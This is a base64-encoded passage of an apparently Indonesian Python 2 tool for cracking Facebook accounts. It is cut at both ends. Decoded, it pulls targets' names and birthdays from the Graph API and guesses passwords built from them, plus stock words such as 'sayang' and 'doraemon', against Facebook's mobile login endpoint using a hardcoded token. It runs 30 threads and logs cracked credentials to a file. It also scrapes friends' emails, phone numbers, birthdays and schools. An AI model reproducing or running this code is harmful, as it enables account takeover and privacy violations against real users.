CgkJCQoJZGVmIG1haW4oYXJnKToKCQlnbG9iYWwgY2VrcG9pbnQsb2tzCgkJdXNlciA9IGFyZwoJ
CXRyeToKCQkJb3MubWtkaXIoJ291dCcpCgkJZXhjZXB0IE9TRXJyb3I6CgkJCXBhc3MKCQl0cnk6
CgkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisn
Lz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQkJYiA9IGpzb24ubG9hZHMoYS50ZXh0KQoJCQlwYXNz
MSA9IGJbJ2ZpcnN0X25hbWUnXSsnMTIzJwoJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBz
Oi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3
NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0
PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29y
ZD0iKyhwYXNzMSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1
NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJ
aWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCXByaW50ICdceDFiWzMzOzFtW0NwK10gXHgxYlsw
OzFtSUQgXHgxYlsxOzkxbSAgICAgIDogXHgxYlswOzFtJyArIHVzZXIKCQkJCXByaW50ICdceDFi
WzMzOzFtWyFdIFx4MWJbMDsxbVBhc3N3b3JkIFx4MWJbMTs5MW06IFx4MWJbMDsxbScgKyBwYXNz
MSArICdcbicKCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMSkKCQkJZWxzZToKCQkJCWlmICd3d3cu
ZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQlwcmludCAnXHgxYlszMjsxbVtP
S+Kck10gXHgxYlswOzFtSUQgXHgxYlsxOzkxbSAgICAgIDogXHgxYlswOzFtJyArIHVzZXIKCQkJ
CQlwcmludCAnXHgxYlszMjsxbVviiJpdIFx4MWJbMDsxbVBhc3N3b3JkIFx4MWJbMTs5MW06IFx4
MWJbMDsxbScgKyBwYXNzMSArICdcbicKCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0
IiwgImEiKQoJCQkJCWNlay53cml0ZSgiSUQ6IiArdXNlcisgIiBQdzoiICtwYXNzMSsiXG4iKQoJ
CQkJCWNlay5jbG9zZSgpCgkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczEpCgkJCQllbHNl
OgoJCQkJCXBhc3MyID0gYlsnZmlyc3RfbmFtZSddKycxMjM0NScKCQkJCQlkYXRhID0gdXJsbGli
LnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2Fj
Y2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVk
MWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2Fs
ZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29v
a2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJcSA9IGpz
b24ubG9hZChkYXRhKQoJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCXByaW50ICdc
eDFiWzMzOzFtW0NQK10gXHgxYlswOzFtSUQgXHgxYlsxOzkxbSAgICAgIDogXHgxYlswOzFtJyAr
IHVzZXIKCQkJCQkJcHJpbnQgJ1x4MWJbMzM7MW1bIV0gXHgxYlswOzFtUGFzc3dvcmQgXHgxYlsx
OzkxbTogXHgxYlswOzFtJyArIHBhc3MyICsgJ1xuJwoJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFz
czIpCgkJCQkJZWxzZToKCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21z
ZyJdOgoJCQkJCQkJcHJpbnQgJ1x4MWJbMzI7MW1bT0vinJNdIFx4MWJbMDsxbUlEIFx4MWJbMTs5
MW0gICAgICA6IFx4MWJbMDsxbScgKyB1c2VyCgkJCQkJCQlwcmludCAnXHgxYlszMjsxbVviiJpd
IFx4MWJbMDsxbVBhc3N3b3JkIFx4MWJbMTs5MW06IFx4MWJbMDsxbScgKyBwYXNzMiArICdcbicK
CQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQljZWsud3Jp
dGUoIklEOiIgK3VzZXIrICIgUHc6IiArcGFzczIrIlxuIikKCQkJCQkJCWNlay5jbG9zZSgpCgkJ
CQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMikKCQkJCQkJZWxzZToKCQkJCQkJCXBhc3Mz
ID0gYlsnbGFzdF9uYW1lJ10gKyAnMTIzJwoJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJo
dHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49
MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZv
cm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFz
c3dvcmQ9IisocGFzczMpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9
M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJcSA9IGpzb24ubG9hZChk
YXRhKQoJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQlwcmludCAnXHgxYlsz
MzsxbVtDUCtdIFx4MWJbMDsxbUlEIFx4MWJbMTs5MW0gICAgICA6IFx4MWJbMDsxbScgKyB1c2Vy
CgkJCQkJCQkJcHJpbnQgJ1x4MWJbMzM7MW1bIV0gXHgxYlswOzFtUGFzc3dvcmQgXHgxYlsxOzkx
bTogXHgxYlswOzFtJyArIHBhc3MzICsgJ1xuJwoJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNz
MykKCQkJCQkJCWVsc2U6CgkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9y
X21zZyJdOgoJCQkJCQkJCQlwcmludCAnXHgxYlszMjsxbVtPS+Kck10gXHgxYlswOzFtSUQgXHgx
YlsxOzkxbSAgICAgIDogXHgxYlswOzFtJyArIHVzZXIKCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMzI7
MW1b4oiaXSBceDFiWzA7MW1QYXNzd29yZCBceDFiWzE7OTFtOiBceDFiWzA7MW0nICsgcGFzczMg
KyAnXG4nCgkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJ
CQkJCWNlay53cml0ZSgiSUQ6IiArdXNlcisgIiBQdzoiICtwYXNzMysiXG4iKQoJCQkJCQkJCQlj
ZWsuY2xvc2UoKQoJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMykKCQkJCQkJCQll
bHNlOgoJCQkJCQkJCQlwYXNzNCA9ICdzYXlhbmcnCgkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJs
b3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNz
X3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIy
NjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVu
X1VTJnBhc3N3b3JkPSIrKHBhc3M0KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVz
PTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJcSA9IGpz
b24ubG9hZChkYXRhKQoJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQkJCQkJ
cHJpbnQgJ1x4MWJbMzM7MW1bY3ArXSBceDFiWzA7MW1JRCBceDFiWzE7OTFtICAgICAgOiBceDFi
WzA7MW0nICsgdXNlcgoJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMzM7MW1b4p65XSBceDFiWzA7MW1Q
YXNzd29yZCBceDFiWzE7OTFtOiBceDFiWzA7MW0nICsgcGFzczQgKyAnXG4nCgkJCQkJCQkJCQlv
a3MuYXBwZW5kKHVzZXIrcGFzczQpCgkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQlpZiAnd3d3LmZh
Y2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMzI7
MW1bT0vinJNdIFx4MWJbMDsxbUlEIFx4MWJbMTs5MW0gICAgICA6IFx4MWJbMDsxbScgKyB1c2Vy
CgkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMzI7MW1b4oiaXSBceDFiWzA7MW1QYXNzd29yZCBceDFi
WzE7OTFtOiBceDFiWzA7MW0nICsgcGFzczQgKyAnXG4nCgkJCQkJCQkJCQkJY2VrID0gb3Blbigi
b3V0L3N1cGVyX2NwLnR4dCIsICJhIikKCQkJCQkJCQkJCQljZWsud3JpdGUoIklEOiIgK3VzZXIr
ICIgUHc6IiArcGFzczQrIlxuIikKCQkJCQkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJCQkJCWNl
a3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M0KQoJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQliaXJ0
aGRheSA9IGJbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQlwYXNzNSA9IGJpcnRoZGF5LnJlcGxhY2Uo
Jy8nLCAnJykKCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGku
ZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2
NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2Rr
X3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNz
NSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFm
Y2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQkJ
CQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCQkJCQkJCXByaW50ICdceDFiWzMz
OzFtW2NwXSBceDFiWzA7MW1JRCBceDFiWzE7OTFtICAgICAgOiBceDFiWzA7MW0nICsgdXNlcgoJ
CQkJCQkJCQkJCQlwcmludCAnXHgxYlszMzsxbVshXSBceDFiWzA7MW1QYXNzd29yZCBceDFiWzE7
OTFtOiBceDFiWzA7MW0nICsgcGFzczUgKyAnXG4nCgkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNl
citwYXNzNSkKCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNv
bScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQlwcmludCAnXHgxYlszMjsxbVtPS+Kc
k10gXHgxYlswOzFtSUQgXHgxYlsxOzkxbSAgICAgIDogXHgxYlswOzFtJyArIHVzZXIKCQkJCQkJ
CQkJCQkJCXByaW50ICdceDFiWzMyOzFtW+KIml0gXHgxYlswOzFtUGFzc3dvcmQgXHgxYlsxOzkx
bTogXHgxYlswOzFtJyArIHBhc3M1ICsgJ1xuJwoJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0
L3N1cGVyX2NwLnR4dCIsICJhIikKCQkJCQkJCQkJCQkJCWNlay53cml0ZSgiSUQ6IiArdXNlcisg
IiBQdzoiICtwYXNzNSsiXG4iKQoJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJ
CWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M1KQoJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJ
CQkJcGFzczYgPSAnZG9yYWVtb24nCgkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4o
Imh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tl
bj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEm
Zm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZw
YXNzd29yZD0iKyhwYXNzNikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNp
Zz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQlxID0ganNv
bi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQkJ
CQkJCQkJCXByaW50ICdceDFiWzMzOzFtW2NwXSBceDFiWzA7MW1JRCBceDFiWzE7OTFtICAgICAg
OiBceDFiWzA7MW0nICsgdXNlcgoJCQkJCQkJCQkJCQkJCXByaW50ICdceDFiWzMzOzFtWyFdIFx4
MWJbMDsxbVBhc3N3b3JkIFx4MWJbMTs5MW06IFx4MWJbMDsxbScgKyBwYXNzNiArICdcbicKCQkJ
CQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczYpCgkJCQkJCQkJCQkJCQllbHNlOgoJCQkJ
CQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJ
CQkJCQkJCQkJcHJpbnQgJ1x4MWJbMzI7MW1bT0vinJNdIFx4MWJbMDsxbUlEIFx4MWJbMTs5MW0g
ICAgICA6IFx4MWJbMDsxbScgKyB1c2VyCgkJCQkJCQkJCQkJCQkJCXByaW50ICdceDFiWzMyOzFt
W+KIml0gXHgxYlswOzFtUGFzc3dvcmQgXHgxYlsxOzkxbTogXHgxYlswOzFtJyArIHBhc3M2ICsg
J1xuJwoJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJ
CQkJCQkJCQkJCQkJCQljZWsud3JpdGUoIklEOiIgK3VzZXIrICIgUHc6IiArcGFzczYrIlxuIikK
CQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5k
KHVzZXIrcGFzczYpCgkJZXhjZXB0OgoJCQlwYXNzCgkJCglwID0gVGhyZWFkUG9vbCgzMCkKCXAu
bWFwKG1haW4sIGlkKQoJcHJpbnQgJ1wwMzNbMTs5Nm1bXDAzM1sxOzk3beKck1wwMzNbMTs5Nm1d
IFwwMzNbMTs5Mm1TZWxlc2FpIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzk2bVsrXSBc
MDMzWzMzOzFtVG90YWwgQ1AvXHgxYlszMjsxbU9LIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK3N0
cihsZW4ob2tzKSkrIlwwMzNbMTs5N20vXDAzM1sxOzkzbSIrc3RyKGxlbihjZWtwb2ludCkpCglw
cmludCgiXDAzM1sxOzk2bVsrXSBcMDMzWzE7OTJtQ1AgRmlsZSB0ZXJzaW1wYW4gXDAzM1sxOzkx
bTogXDAzM1sxOzk3bW91dC9zdXBlcl9jcC50eHQiKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1b
XDAzM1sxOzk3bUtlbWJhbGlcMDMzWzE7OTZtXSIpCglzdXBlcigpCgoKZGVmIGdydXBzYXlhKCk6
Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJyku
cmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1U
b2tlbiBpbnZhbGlkIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVl
cCgxKQoJCWtlbHVhcigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoK
CQlwYXNzCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50IDQyKiJcMDMzWzE7
OTZtPSIKCXRyeToKCQl1aCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5j
b20vbWUvZ3JvdXBzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWd1ZCA9IGpzb24ubG9hZHModWgu
dGV4dCkKCQlmb3IgcCBpbiBndWRbJ2RhdGEnXToKCQkJbmFtYSA9IHBbIm5hbWUiXQoJCQlpZCA9
IHBbImlkIl0KCQkJZj1vcGVuKCdvdXQvR3J1cGlkLnR4dCcsJ3cnKQoJCQlsaXN0Z3J1cC5hcHBl
bmQoaWQpCgkJCWYud3JpdGUoaWQgKyAnXG4nKQoJCQlwcmludCgiXDAzM1sxOzk2bVvinJNdIFww
MzNbMTs5Mm1HUk9VUCBTQVlBIikKCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4p65XSBcMDMzWzE7OTdt
SUQgIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK3N0cihpZCkpCgkJCXByaW50KCJcMDMzWzE7OTZt
W+KeuV0gXDAzM1sxOzk3bU5hbWFcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIitzdHIobmFtYSkgKyAn
XG4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTZtPSIKCQlwcmludCJcMDMzWzE7OTZtWytdIFwwMzNb
MTs5Mm1Ub3RhbCBHcm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJXMiJShsZW4obGlzdGdydXAp
KQoJCXByaW50KCJcMDMzWzE7OTZtWytdIFwwMzNbMTs5Mm1UZXJzaW1wYW4gXDAzM1sxOzkxbTog
XDAzM1sxOzk3bW91dC9HcnVwaWQudHh0IikKCQlmLmNsb3NlKCkKCQlyYXdfaW5wdXQoIlxuXDAz
M1sxOzk2bVtcMDMzWzE7OTdtS2VtYmFsaVwwMzNbMTs5Nm1dIikKCQltZW51KCkKCWV4Y2VwdCAo
S2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTZtWyFdIFx4MWJb
MTs5MW1UZXJoZW50aSIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUtlbWJh
bGlcMDMzWzE7OTZtXSIpCgkJbWVudSgpCglleGNlcHQgS2V5RXJyb3I6CgkJb3MucmVtb3ZlKCdv
dXQvR3J1cGlkLnR4dCcpCgkJcHJpbnQoJ1wwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbUdyb3VwIHRp
ZGFrIGRpdGVtdWthbicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUtlbWJh
bGlcMDMzWzE7OTZtXSIpCgkJbWVudSgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25u
ZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzk2bVvinJZdIFx4MWJbMTs5MW1UaWRhayBhZGEg
a29uZWtzaSIKCQlrZWx1YXIoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQgIlwwMzNbMTs5Nm1b
IV0gXHgxYlsxOzkxbUVycm9yIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5N21L
ZW1iYWxpXDAzM1sxOzk2bV0iKQoJCW1lbnUoKQoKZGVmIGluZm9ybWFzaSgpOgoJb3Muc3lzdGVt
KCdjbGVhcicpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhj
ZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBpbnZhbGlkIgoJCW9zLnN5
c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWtlbHVhcigpCglvcy5z
eXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50IDQyKiJcMDMzWzE7OTZtPSIKCWFpZCA9
IHJhd19pbnB1dCgnXDAzM1sxOzk2bVsrXSBcMDMzWzE7OTNtTWFzdWthbiBJRC9OYW1hXDAzM1sx
OzkxbSA6IFwwMzNbMTs5N20nKQoJamFsYW4oJ1wwMzNbMTs5Nm1b4py6XSBcMDMzWzE7OTNtVHVu
Z2d1IHNlYmVudGFyIFwwMzNbMTs5N20uLi4nKQoJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9n
cmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCWNvayA9
IGpzb24ubG9hZHMoci50ZXh0KQoJZm9yIGkgaW4gY29rWydkYXRhJ106CgkJaWYgYWlkIGluIGlb
J25hbWUnXSBvciBhaWQgaW4gaVsnaWQnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9n
cmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXog
PSBqc29uLmxvYWRzKHgudGV4dCkKCQkJcHJpbnQgNDMqIlwwMzNbMTs5Nm09IgoJCQl0cnk6CgkJ
CQlwcmludCAnXDAzM1sxOzk2bVvinrldIFwwMzNbMTs5M21OYW1hXDAzM1sxOzk3bSAgICAgICAg
ICA6ICcrelsnbmFtZSddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5Nm1bP10g
XDAzM1sxOzkzbU5hbWFcMDMzWzE7OTdtICAgICAgICAgIDogXDAzM1sxOzkxbVRpZGFrIGFkYScK
CQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5Nm1b4p65XSBcMDMzWzE7OTNtSURcMDMzWzE7OTdt
ICAgICAgICAgICAgOiAnK3pbJ2lkJ10KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sx
Ozk2bVs/XSBcMDMzWzE7OTNtSURcMDMzWzE7OTdtICAgICAgICAgICAgOiBcMDMzWzE7OTFtVGlk
YWsgYWRhJwoJCQl0cnk6CgkJCQlwcmludCAnXDAzM1sxOzk2bVvinrldIFwwMzNbMTs5M21FbWFp
bFwwMzNbMTs5N20gICAgICAgICA6ICcrelsnZW1haWwnXQoJCQlleGNlcHQgS2V5RXJyb3I6IHBy
aW50ICdcMDMzWzE7OTZtWz9dIFwwMzNbMTs5M21FbWFpbFwwMzNbMTs5N20gICAgICAgICA6IFww
MzNbMTs5MW1UaWRhayBhZGEnCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTZtW+KeuV0gXDAz
M1sxOzkzbU5vIEhQXDAzM1sxOzk3bSAgICAgICAgIDogJyt6Wydtb2JpbGVfcGhvbmUnXQoJCQll
eGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTZtWz9dIFwwMzNbMTs5M21ObyBIUFwwMzNb
MTs5N20gICAgICAgICA6IFwwMzNbMTs5MW1UaWRhayBhZGEnCgkJCXRyeToKCQkJCXByaW50ICdc
MDMzWzE7OTZtW+KeuV0gXDAzM1sxOzkzbVRlbXBhdCB0aW5nZ2FsXDAzM1sxOzk3bTogJyt6Wyds
b2NhdGlvbiddWyduYW1lJ10KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzk2bVs/
XSBcMDMzWzE7OTNtVGVtcGF0IHRpbmdnYWxcMDMzWzE7OTdtOiBcMDMzWzE7OTFtVGlkYWsgYWRh
JwoJCQl0cnk6CgkJCQlwcmludCAnXDAzM1sxOzk2bVvinrldIFwwMzNbMTs5M21UYW5nZ2FsIGxh
aGlyXDAzM1sxOzk3bSA6ICcrelsnYmlydGhkYXknXQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50
ICdcMDMzWzE7OTZtWz9dIFwwMzNbMTs5M21UYW5nZ2FsIGxhaGlyXDAzM1sxOzk3bSA6IFwwMzNb
MTs5MW1UaWRhayBhZGEnCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTZtW+KeuV0gXDAzM1sx
OzkzbVNla29sYWhcMDMzWzE7OTdtICAgICAgIDogJwoJCQkJZm9yIHEgaW4gelsnZWR1Y2F0aW9u
J106CgkJCQkJdHJ5OgoJCQkJCQlwcmludCAnXDAzM1sxOzkxbSAgICAgICAgICAgICAgICAgICB+
IFwwMzNbMTs5N20nK3FbJ3NjaG9vbCddWyduYW1lJ10KCQkJCQlleGNlcHQgS2V5RXJyb3I6IHBy
aW50ICdcMDMzWzE7OTFtICAgICAgICAgICAgICAgICAgIH4gXDAzM1sxOzkxbVRpZGFrIGFkYScK
CQkJZXhjZXB0IEtleUVycm9yOiBwYXNzCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNb
MTs5N21LZW1iYWxpXDAzM1sxOzk2bV0iKQoJCQltZW51KCkKCQllbHNlOgoJCQlwYXNzCgllbHNl
OgoJCXByaW50IlwwMzNbMTs5Nm1b4pyWXSBceDFiWzE7OTFtQWt1biB0aWRhayBkaXRlbXVrYW4i
CgkJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUtlbWJhbGlcMDMzWzE7OTZtXSIp
CgkJbWVudSgpCgpkZWYgeWFob28oKToKCWdsb2JhbCB0b2tldAoJb3Muc3lzdGVtKCdjbGVhcicp
Cgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJy
b3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBpbnZhbGlkIgoJCW9zLnN5c3RlbSgncm0g
LXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWtlbHVhcigpCglvcy5zeXN0ZW0oJ2Ns
ZWFyJykKCXByaW50IGxvZ28KCXByaW50IDQyKiJcMDMzWzE7OTZtPSIKCXByaW50ICJcMDMzWzE7
OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIENyYWNrIERhcmkgRGFm
dGFyIFRlbWFuIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0y
LlwwMzNbMTs5N20gQ3JhY2sgRGFyaSBUZW1hbiBEYXJpIFRlbWFuIgogICAgICAgIHByaW50ICJc
MDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIENyYWNrIERh
cmkgVGVtYW4gTWVtYmVyIEdydXAiCiAgICAgICAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNb
MTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gQ3JhY2sgRGFyaSBGaWxlIgoJcHJpbnQgIlww
MzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gS2VtYmFsaSIK
CWNsb25lKCkKICAgICAgIApkZWYgY2xvbmUoKToKCWVtYnVoID0gcmF3X2lucHV0KCJcMDMzWzE7
OTdt4pWa4pWQXDAzM1sxOzkxbT4+PiBcMDMzWzE7OTdtIikKCWlmIGVtYnVoID09IiI6CgkJcHJp
bnQgIlwwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbUlzaSB5YW5nIGJlbmFyIgoJZWxpZiBlbWJ1aCA9
PSIxIjoKCQljbG9uZV9kYXJpX2RhZnRhcl90ZW1hbigpCgllbGlmIGVtYnVoID09IjIiOgoJCWNs
b25lX2RhcmlfdGVtYW4oKQoJZWxpZiBlbWJ1aCA9PSIzIjoKCQljbG9uZV9kYXJpX21lbWJlcl9n
